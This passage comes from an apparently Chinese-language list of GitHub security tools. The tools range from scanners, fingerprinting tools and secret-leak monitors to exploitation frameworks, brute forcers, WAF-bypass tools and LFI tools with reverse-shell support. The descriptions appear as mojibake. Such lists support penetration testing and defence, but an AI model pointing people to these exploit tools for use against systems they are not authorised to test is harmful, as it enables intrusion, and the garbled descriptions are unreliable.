href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a><br>(å¤šçº¿ç¨‹æ¢æµ‹å¼±å£ä»¤)<br><a href="https://github.com/s0md3v/Blazy">https://github.com/s0md3v/Blazy</a><br>(æ”¯æŒæµ‹è¯•CSRFï¼ŒClickjackingï¼ŒCloudflareå’ŒWAFçš„å¼±å£ä»¤æ¢æµ‹å™¨)<br><a href="https://github.com/MooseDojo/myBFF">https://github.com/MooseDojo/myBFF</a><br>(å¯¹CiscoVPNï¼ŒCitrix Gatewayç­‰å„ç±»æœåŠ¡è¿›è¡Œå¼±å£ä»¤æ£€æµ‹çš„è„šæœ¬)<br><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a><br>(ç‰©è”ç½‘è®¾å¤‡é»˜è®¤å¯†ç æ‰«ææ£€æµ‹å·¥å…·)<br><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a><br>(ä½¿ç”¨nmapæ‰«æIoTè®¾å¤‡)<br><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a><br>(è·¯ç”±å™¨è®¾å¤‡æ¼æ´æ‰«æåˆ©ç”¨)<br><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a><br>(TelnetæœåŠ¡å¯†ç æ’åº“)<br><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a><br>(è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†åŠæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ¯”è¾ƒé€‚ç”¨äºIoTæ‰«æ)<br><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a><br>(åµŒå…¥å¼è®¾å¤‡æ¼æ´æ‰«æåŠåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>(ä¸€æ¬¾XSSæ‰«æå™¨ï¼Œå¯æš´åŠ›æ³¨å…¥å‚æ•°)<br><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a><br>(å°å‹XSSæ‰«æå™¨ï¼Œä¹Ÿå¯æ£€æµ‹CRLFï¼ŒXSSï¼Œç‚¹å‡»åŠ«æŒçš„)<br><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a><br>(PHPç‰ˆæœ¬çš„åå°„å‹xssæ‰«æ)<br><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a><br>(æ‰¹é‡æ‰«æXSSçš„pythonè„šæœ¬)<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a><br>(è‡ªåŠ¨åŒ–æ£€æµ‹é¡µé¢æ˜¯å¦å­˜åœ¨XSSå’Œè·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´çš„æµè§ˆå™¨æ’ä»¶)<br><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a><br>(ä½¿ç”¨å‘½ä»¤è¡Œè¿›è¡ŒXSSæ‰¹é‡æ£€æµ‹)<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>(å¯è¯†åˆ«å’Œç»•è¿‡WAFçš„XSSæ‰«æå·¥å…·)<br><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a><br>(æ”¯æŒGETï¼ŒPOSTæ–¹å¼çš„é«˜æ•ˆXSSæ‰«æå™¨)<br><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a><br>(ç½‘ç»œèµ„äº§è¯†åˆ«å¼•æ“ï¼Œæ¼æ´æ£€æµ‹å¼•æ“)<br><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><br>(ä¼ä¸šè¢«æœç´¢å¼•æ“æ”¶å½•æ•æ„Ÿèµ„äº§ä¿¡æ¯ç›‘æ§è„šæœ¬ï¼šå‘˜å·¥é‚®ç®±ï¼Œå­åŸŸåï¼Œä¸»æŒäºº)<br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a><br>(Bingï¼Œgoogleï¼Œ360ï¼Œzoomeye ç­‰æœç´¢å¼•æ“èšåˆæœç´¢ï¼Œå¯ç”¨äºå‘ç°ä¼ä¸šè¢«æœç´¢å¼•æ“æ”¶å½•çš„æ•æ„Ÿèµ„äº§ä¿¡æ¯)<br><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a><br>(èƒ½æˆæŠ“å–æœç´¢å¼•æ“éšè—çš„urlï¼Œå¹¶äº¤ç”±sqlmapï¼Œnmapæ‰«æ)<br><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a><br>(ä¼ä¸šå†…ç½‘åŸºç¡€æœåŠ¡å®‰å…¨æ‰«ææ¡†æ¶)<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>(github Repoä¿¡æ¯æœé›†å·¥å…·)<br><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a><br>(.svnæ–‡ä»¶å¤¹æ³„æ¼åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a><br>(GitHubæ•æ„Ÿä¿¡æ¯æ‰«æå·¥å…·)<br><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>(ä¼ä¸šèµ„äº§ï¼Œæ•æ„Ÿä¿¡æ¯GitHubæ³„éœ²ç›‘æ§ç³»ç»Ÿ)<br><a href="https://github.com/lianfeng30/githubscan">https://github.com/lianfeng30/githubscan</a><br>(æ ¹æ®ä¼ä¸šå…³é”®è¯è¿›è¡Œé¡¹ç›®æ£€ç´¢ä»¥åŠç›¸åº”æ•æ„Ÿæ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹æ‰«æçš„å·¥å…·)<br><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a><br>(githubæ•æ„Ÿä¿¡æ¯æœç´¢å·¥å…·)<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>( .gitæ–‡ä»¶å¤¹æ³„æ¼åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br>(GitHubæ•æ„Ÿä¿¡æ¯æ‰«æå·¥å…·ï¼ŒåŒ…æ‹¬æ£€æµ‹æäº¤ç­‰)<br><a href="https://github.com/1N3/Goohak">https://github.com/1N3/Goohak</a><br>(è‡ªåŠ¨åŒ–å¯¹æŒ‡å®šåŸŸåè¿›è¡ŒGoogle hackingæœç´¢å¹¶æ”¶é›†ä¿¡æ¯)<br><a href="https://github.com/UKHomeOffice/repo-security-scanner">https://github.com/UKHomeOffice/repo-security-scanner</a><br>(ç”¨äºæœç´¢gitçš„æ‰¿è¯ºä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç ï¼Œç§é’¥ç­‰çš„å®¢æˆ·ç«¯å·¥å…·)<br><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a><br>(Githubæ•æ„Ÿä¿¡æ¯æ³„éœ²æ‰«æ)<br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>(Githubæ³„éœ²å·¡èˆªå·¥å…·)<br><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a><br>(Webç«™ç‚¹ä¿¡æ¯æœé›†å·¥å…·ï¼ŒåŒ…æ‹¬é‚®ç®±ï¼Œç”µè¯ç­‰ä¿¡æ¯)<br><a href="https://github.com/anshumanbh/git-all-secrets">https://github.com/anshumanbh/git-all-secrets</a><br>(é›†åˆå¤šä¸ªå¼€æºGitHubæ•æ„Ÿä¿¡æ¯æ‰«æçš„ä¼ä¸šä¿¡æ¯æ³„éœ²å·¡èˆªå·¥å…·)<br><a href="https://github.com/s0md3v/Photon">https://github.com/s0md3v/Photon</a><br>(å¯ä»¥æå–ç½‘å€ï¼Œç”µå­é‚®ä»¶ï¼Œæ–‡ä»¶ï¼Œç½‘ç«™å¸æˆ·ç­‰çš„é«˜é€Ÿçˆ¬è™«)<br><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a><br>(ä¸€æ¬¾ç®€å•çš„webshellæ£€æµ‹å·¥å…·)<br><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a><br>(å“ˆå‹ƒåˆ†æç³»ç»Ÿï¼ŒLINUXç³»ç»Ÿç—…æ¯’åˆ†æåŠå®‰å…¨æ£€æµ‹)<br><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a><br>(ä½¿ç”¨pythonå®ç°çš„é›†æˆClamAVï¼ŒESETï¼ŒBitdefenderçš„åç—…æ¯’å¼•æ“)<br><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a><br>(ä¸€æ¬¾é«˜æ•ˆç‡PHP-webshellæ‰«æå·¥å…·)<br><a href="https://github.com/emposha/PHP-Shell-Detector/">https://github.com/emposha/PHP-Shell-Detector/</a><br>(æµ‹è¯•æ•ˆç‡é«˜è¾¾99%çš„webshellæ£€æµ‹å·¥å…·)<br><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a><br>(ä¸€æ¬¾ç®€æ´çš„çš„Webshellæ‰«æå·¥å…·)<br><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a><br>(Webshellæ‰«æå·¥å…·ï¼Œæ”¯æŒphp / perl / asp / aspx webshellæ‰«æ)<br><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a><br>(ä¸€æ¬¾æœ¨é©¬ï¼Œåƒµå°¸ç½‘ç»œåˆ†ææ¡†æ¶)<br><a href="https://github.com/droidefense/engine">https://github.com/droidefense/engine</a><br>(é«˜çº§å®‰å“æœ¨é©¬ç—…æ¯’åˆ†ææ¡†æ¶)<br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a><br>(åŸºäºç½‘ç»œæµé‡çš„å†…ç½‘æ¢æµ‹æ¡†æ¶)<br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a><br>(è°ƒç”¨Windows APIæšä¸¾ç”¨æˆ·ç™»å½•ä¿¡æ¯)<br><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a><br>(è‡ªåŠ¨åŒ–åˆ©ç”¨XSSå…¥ä¾µå†…ç½‘)<br><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a><br>(ç›®æ ‡ç«¯å£æ‰«æ+ç³»ç»ŸæœåŠ¡æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a><br>(åŠ¨æ€å¤šçº¿ç¨‹æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹å·¥å…·)<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>(WAFäº§å“æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>(SSLç±»å‹è¯†åˆ«)<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>(WebæŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a><br>(Webåº”ç”¨æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>(ç½‘ç»œçˆ¬è™«å¼æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a><br>(åŸºäºMasscanå’ŒZmapçš„ç½‘ç»œæ‰«æå™¨)<br><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a><br>(ç½‘ç»œèµ„äº§ä¿¡æ¯æ‰«æï¼ŒICMPå­˜æ´»æ¢æµ‹ï¼Œç«¯å£æ‰«æï¼Œç«¯å£æŒ‡çº¹æœåŠ¡è¯†åˆ«)<br><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a><br>(ä¸­é—´ä»¶æ‰«æ)<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>(webè·¯å¾„æ”¶é›†ä¸æ‰«æ)<br><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a><br>(Cæ®µæ¨ªå¹…ä¸è·¯å¾„æ‰«æ)<br><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a><br>(ç«¯å£æœåŠ¡æ‰«æ)<br><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a><br>(wafè‡ªåŠ¨æš´ç ´)<br><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a><br>(å°è¯•æ‰¾å‡ºcdnèƒŒåçš„çœŸå®ip)<br><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a><br>(åŸºäºBingæœç´¢å¼•æ“çš„Cæ®µ/æ—ç«™æŸ¥è¯¢ï¼Œå¤šçº¿ç¨‹ï¼Œæ”¯æŒAPI)<br><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a><br>(å¤šçº¿ç¨‹WEBç›®å½•çˆ†ç ´å·¥å…·)<br><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a><br>(ä¸€ä¸ªçˆ¬è™«å¼çš„ç½‘æ®µWebä¸»æœºå‘ç°å°å·¥å…·)<br><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a><br>(Thornä¸Šå®ç°çš„åˆ†å¸ƒå¼ä»»åŠ¡åˆ†å‘çš„ipç«¯å£æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a><br>(ç±»ä¼¼zgrabçš„å¿«é€ŸTCPæŒ‡çº¹æŠ“å–è§£æå·¥å…·ï¼Œæ”¯æŒæ›´å¤šåè®®)<br><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a><br>(CDNè¯†åˆ«ï¼Œæ£€æµ‹)<br><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a><br>(åŸºäºçˆ¬è™«çš„webè·¯å¾„æ‰«æå™¨)<br><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a><br>(æœåŠ¡å™¨sshé…ç½®ä¿¡æ¯æ‰«æ)<br><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a><br>(é’ˆå¯¹åŸŸååŠå…¶å­åŸŸåçš„èµ„äº§æ•°æ®æ£€æµ‹/æ‰«æï¼ŒåŒ…æ‹¬http / httpsæ£€æµ‹ç­‰)<br><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a><br>(åŸŸåèµ„äº§æ”¶é›†åŠæŒ‡çº¹è¯†åˆ«å·¥å…·)<br><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a><br>(CMSè¯†åˆ«python geventå®ç°)<br><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a><br>(æ•æ„Ÿæ–‡ä»¶æ‰«æ/äºŒæ¬¡åˆ¤æ–­é™ä½è¯¯æŠ¥ç‡/æ‰«æå†…å®¹è§„åˆ™åŒ–/å¤šç›®å½•æ‰«æ)<br><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a><br>(åŸºäºçˆ¬è™«çš„åŠ¨æ€æ•æ„Ÿæ–‡ä»¶æ¢æµ‹å·¥å…·)<br><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a><br>(webè·¯å¾„æ‰«æå·¥å…·)<br><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a><br>(ç½‘ç»œè®¾å¤‡webæœåŠ¡æŒ‡çº¹æ‰«æä¸æ£€ç´¢)<br><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a><br>(ç›®æ ‡ä¸»æœºæœåŠ¡sslç±»å‹è¯†åˆ«)<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>(Webåº”ç”¨fuzzå·¥å…·ï¼Œæ¡†æ¶ï¼ŒåŒæ—¶å¯ç”¨äºwebè·¯å¾„/æœåŠ¡æ‰«æ)<br><a href="https://github.com/s0md3v/Breacher">https://github.com/s0md3v/Breacher</a><br>(å¤šçº¿ç¨‹çš„åå°è·¯å¾„æ‰«æå™¨ï¼Œä¹Ÿå¯ç”¨äºå‘ç°é‡å®šå‘æ¼æ´åæ‰§è¡Œ)<br><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a><br>(å¼±å£ä»¤æ‰«æå™¨ï¼Œä¸ä»…æ”¯æŒæ™®é€šç™»å½•é¡µï¼Œä¹Ÿæ”¯æŒsshï¼Œmongodbç­‰ç»„ä»¶)<br><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ï¼Œæ”¯æŒåˆ†ææ•°æ®åŒ…ï¼Œè§£ç ï¼Œç«¯å£æ‰«æï¼ŒIPåœ°å€åˆ†æç­‰)<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>(åŸºäºnmapçš„æ‰«æå™¨ï¼Œä¸cveæ¼æ´å…³è”)<br><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a><br>(åŸºäºnmapçš„é«˜çº§æ¼æ´æ‰«æå™¨ï¼Œå‘½ä»¤è¡Œç¯å¢ƒä½¿ç”¨)<br><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a><br>(webåº”ç”¨ä¿¡æ¯æœé›†å·¥å…·)<br><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a><br>(å›´ç»•webæœåŠ¡çš„åŸŸåè¿›è¡Œä¿¡æ¯æ”¶é›†å’Œâ€œåŸŸä¼ é€â€ç­‰æ¼æ´æ‰«æï¼Œä¹Ÿæ”¯æŒé’ˆå¯¹èƒŒåçš„æœåŠ¡å™¨ç«¯å£æ‰«æç­‰)<br><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a><br>(åŸºäºNiktoæ‰«æè§„åˆ™çš„è¢«åŠ¨å¼è·¯å¾„æ‰«æä»¥åŠä¿¡æ¯çˆ¬è™«)<br><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a><br>(å¿«é€Ÿè¯†åˆ«WEBæœåŠ¡å™¨ç±»å‹ï¼ŒCMSç±»å‹ï¼ŒWAFç±»å‹ï¼ŒWHOISä¿¡æ¯ï¼Œä»¥åŠè¯­è¨€æ¡†æ¶)<br><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a><br>(ç”¨äºæ£€æŸ¥webæœåŠ¡çš„http headerçš„å®‰å…¨æ€§)<br><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a><br>(ä¸€æ¬¾é«˜æ•ˆå¿«æ·çš„æ•æ„Ÿæ–‡ä»¶æ‰«æå·¥å…·)<br><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a><br>(é€šè¿‡å­—å…¸ç©·ä¸¾ï¼Œgoogleï¼Œrobots.txtç­‰é€”å¾„çš„è·¨å¹³å°åå°ç®¡ç†è·¯å¾„æ‰«æå™¨)<br><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a><br>(å¸¸è§„CMSæŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>(WAFæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–ç»•è¿‡å·¥å…·)<br><a href="https://github.com/dzonerzy/goWAPT">https://github.com/dzonerzy/goWAPT</a><br>(ç½‘ç»œåº”ç”¨æ¨¡ç³Šå·¥å…·ï¼Œæ¡†æ¶ï¼ŒåŒæ—¶å¯ç”¨äºç½‘ç»œè·¯å¾„/æœåŠ¡æ‰«æ)<br><a href="https://github.com/blackye/webdirdig">https://github.com/blackye/webdirdig</a><br>(webæ•æ„Ÿç›®å½•/ä¿¡æ¯æ³„æ¼æ‰«æè„šæœ¬)<br><a href="https://github.com/GitHackTools/BillCipher">https://github.com/GitHackTools/BillCipher</a><br>(ç”¨äºç½‘ç«™æˆ–IPåœ°å€çš„ä¿¡æ¯æ”¶é›†å·¥å…·)<br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>(é€šè¿‡æ‰«æå…¨ç½‘è·å¾—çœŸå®IPçš„è‡ªåŠ¨åŒ–ç¨‹åº)<br><a href="https://github.com/boy-hack/w11scan">https://github.com/boy-hack/w11scan</a><br>(åˆ†å¸ƒå¼WEBæŒ‡çº¹è¯†åˆ«å¹³å°)<br><a href="https://github.com/Nekmo/dirhunt">https://github.com/Nekmo/dirhunt</a><br>(çˆ¬è™«å¼webç›®å½•æ‰«æå·¥å…·)<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br>(Jenkinsæ¼æ´æ¢æµ‹ï¼Œç”¨æˆ·æŠ“å–çˆ†ç ´)<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>(é¦–æ¬¾é›†æˆåŒ–çš„Discuzæ‰«æå·¥å…·)<br><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a><br>(ä¸€æ¬¾ç®€æ´ä¼˜é›…çš„CMSæ‰«æåˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a><br>(IISçŸ­æ–‡ä»¶åæš´åŠ›æšä¸¾æ¼æ´åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a><br>(flashxssæ‰«æ)<br><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a><br>(ä¸€ä¸ªèµ·æ¯›æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„åŠè‡ªåŠ¨åŒ–å·¥å…·)<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>(æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´æ£€æµ‹ä¸åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/cr0hn/dockerscan(Docker%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7)">https://github.com/cr0hn/dockerscan(Dockeræ‰«æå·¥å…·)</a><br><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a><br>(ä¸€æ¬¾ç²¾ç®€çš„wordpressæ‰«æå·¥å…·)<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> (é›†æˆåŒ–wordpressæ¼æ´åˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a><br>(ç”¨äºæ‰«æJ2EEåº”ç”¨çš„ä¸€æ¬¾burpsuiteæ’ä»¶)<br><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a><br>(ä¸€æ¬¾åŸºäºperlçš„strut2çš„å†å²æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a><br>(æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨åŠæ‰«æå·¥å…·ï¼Œæ”¯æŒåå¼¹shell)<br><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a><br>(åŸºäºSalt Openä»¥åŠVulners Linux Audit APIçš„linuxæ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒä¸JIRAï¼Œslackå¹³å°ç»“åˆä½¿ç”¨)<br><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a><br>(è‡ªåŠ¨åŒ–æ¢æµ‹å®¢æˆ·ç«¯AngularJSæ¨¡æ¿æ³¨å…¥æ¼æ´å·¥å…·)<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br>(Javaç¼–å†™çš„IISçŸ­æ–‡ä»¶åæš´åŠ›æšä¸¾æ¼æ´åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a><br>(åŸºäºWPScanä»¥åŠWPSekuçš„ä¼˜åŒ–ç‰ˆwordpressæ‰«æå™¨)<br><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a><br>(CMSæ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a><br>(CRLFæ³¨å…¥æ¼æ´æ‰¹é‡æ‰«æ)<br><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a><br>(è‡ªåŠ¨åŒ–æ‰«æå†…ç½‘ä¸­å­˜åœ¨çš„ç”±å½±å­ç»çºªäººæ³„éœ²çš„ETERNALç³»åˆ—æ¼æ´)<br><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a><br>(é€šè¿‡å®šåˆ¶åŒ–çš„è°·æ­Œæœç´¢å¼•æ“è¿›è¡Œæ¼æ´é¡µé¢æœå¯»åŠæ‰«æ)<br><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a><br>(æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨åŠæ‰«æå·¥å…·ï¼Œæ”¯æŒåå¼¹shell)<br><a href="https://github.com/mak-/parameth">https://github.com/mak-/parameth</a><br>(ç”¨äºæšä¸¾è„šæœ¬çš„GET / POSTæœªçŸ¥å‚æ•°å­—æ®µ)<br><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a><br>(struts2çš„æ¼æ´å…¨ç‰ˆæœ¬æ£€æµ‹å’Œåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a><br>(SSLæ¼æ´æ‰«æï¼Œä¾‹å¦‚å¿ƒè„æ»´è¡€æ¼æ´ç­‰)<br><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a><br>(åŸºäºæœç´¢å¼•æ“çš„æ¼æ´ç½‘é¡µæœå¯»)<br><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a><br>(ç”¨äºæ”»å‡»çˆ†ç ´Java RemoteMethod InvocationæœåŠ¡çš„å·¥å…·)<br><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a><br>(æ‰«æjsæ‰©å±•åº“çš„å¸¸è§æ¼æ´)<br><a href="https://github.com/kotobukki/BDA">https://github.com/kotobukki/BDA</a><br>(é’ˆå¯¹çš„hadoop /ç«èŠ±ç­‰å¤§æ•°æ®å¹³å°çš„çš„æ¼æ´æ¢æµ‹å·¥å…·)<br><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a><br>(RegExæ‹’ç»æœåŠ¡æ‰«æå™¨)<br><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a><br>(ä½¿ç”¨NMAPæ‰«æçš„Torç½‘ç»œä¸Šéšè—çš„â€œæ´‹è‘±â€æœåŠ¡)<br><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a><br>(Web CMS Exploitå·¥å…·ï¼ŒåŒ…å«é’ˆå¯¹ä¸»æµCMSçš„66ä¸ªä¸åŒçš„æ¼æ´åˆ©ç”¨)<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>(ä¸€ä¸ªè¿·ä½ çš„ä¿¡æ¯æ³„æ¼æ‰¹é‡æ‰«æè„šæœ¬)<br><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a><br>(æ–‡ä»¶ä¸Šä¼ æ¼æ´æ‰«æå™¨åŠåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a><br>(å­åŸŸåæ¥ç®¡æ¼æ´æ£€æµ‹å·¥å…·ï¼Œæ”¯æŒ30+äº‘æœåŠ¡æ‰˜ç®¡æ£€æµ‹)<br><a 